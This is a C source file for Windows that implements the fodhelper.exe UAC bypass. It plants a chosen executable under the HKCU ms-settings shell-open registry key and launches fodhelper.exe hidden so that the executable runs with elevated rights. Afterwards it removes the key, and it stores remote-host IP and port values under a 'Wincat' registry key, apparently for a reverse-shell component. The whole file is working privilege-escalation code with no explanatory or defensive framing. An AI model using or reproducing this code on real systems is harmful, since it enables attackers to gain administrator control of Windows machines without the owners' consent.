#include <Windows.h>
#include <stdio.h>
#include "Tools.h"


BOOL SaveRHostInfo(char* ipAddress, char* port) {
	const char* regKey = "Software\\Wincat";
	BOOL returnValue = FALSE;

	if (checkKey(regKey)) {
		returnValue = SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "RHostIP", ipAddress);
		returnValue &= SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "RHostPORT", port);
	}
	return returnValue;
}


BOOL ExploitFodhelper(char* PathExeToRun) {
	PVOID pOldVal = NULL;
	const char* regKey = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
	BOOL returnValue = FALSE;

	DisableWindowsRedirection(&pOldVal);
	if (checkKey(regKey)) {
		returnValue = SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "DelegateExecute", "");
		returnValue &= SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "", PathExeToRun);
		if (returnValue) {
			if (!SaveRHostInfo("127.0.0.1", "1337"))
				printf("[X] Fail to save RHOST information !");

			SHELLEXECUTEINFOA ShRun = { 0 };
			ShRun.cbSize = sizeof(SHELLEXECUTEINFOA);
			ShRun.fMask = SEE_MASK_NOCLOSEPROCESS;
			ShRun.hwnd = NULL;
			ShRun.lpVerb = "runas";
			ShRun.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
			ShRun.lpParameters = NULL;
			ShRun.lpDirectory = NULL;
			ShRun.nShow = SW_HIDE;
			ShRun.hInstApp = NULL;
			returnValue = ShellExecuteExA(&ShRun);

			DeleteRegistryKey(HKEY_CURRENT_USER, (char*)"Software\\Classes", "ms-settings");
		}
	}
	RevertWindowsRedirection(pOldVal);

	return returnValue;
}